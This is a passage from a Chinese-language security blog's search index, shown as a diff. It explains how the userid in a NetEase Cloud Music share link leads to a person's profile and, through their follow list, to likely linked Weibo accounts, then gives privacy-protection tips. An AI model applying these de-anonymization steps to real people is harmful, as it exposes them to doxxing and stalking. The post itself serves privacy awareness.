+<h3 id="技术路径-1"><a href="#技术路径-1" class="headerlink" title="技术路径"></a>技术路径</h3><ol>
+<li>解析分享链接中的用户ID参数</li>
+<li>定位目标主站账号</li>
+<li>通过社交关联查找其他平台账号</li>
+</ol>
+<h3 id="操作演示-1"><a href="#操作演示-1" class="headerlink" title="操作演示"></a>操作演示</h3><p>典型分享链接方式：</p>
+<p><img src="/images/20210124220644.png" alt="image-20210124220644165"></p>
+<p>分享链接格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://y.music.163.com/m/song/569157/?userid=3979XXXXX</span><br></pre></td></tr></table></figure>
+
+<p><strong>关键操作</strong>：</p>
+<ul>
+<li>提取<code>userid</code>参数</li>
+<li>构造个人主页链接：<code>music.163.com/#/user/home?id=[userid]</code></li>
+<li>通过”Ta的关注”查找可能的微博关联账号</li>
+</ul>
+<p><img src="/images/20210124221633.png" alt="image-20210124221633116"></p>
+<h2 id="0x04-隐私防护建议"><a href="#0x04-隐私防护建议" class="headerlink" title="0x04 隐私防护建议"></a>0x04 隐私防护建议</h2><ol>
+<li><strong>跨平台隔离</strong>：避免使用相同用户名&#x2F;头像</li>
+<li><strong>链接分享</strong>：慎用自带用户ID的分享功能</li>
+<li><strong>信息审查</strong>：定期检查各平台的公开信息</li>
+<li><strong>安全意识</strong>：了解常见社工手法</li>
+</ol>
+]]></content>
+      <categories>
+        <category>Hacker</category>
+        <category>Security</category>
+        <category>Social Engineering</category>
+      </categories>
+      <tags>
+        <tag>Social Engineering</tag>
+        <tag>Daily Life</tag>
+      </tags>
+  </entry>
+</search>
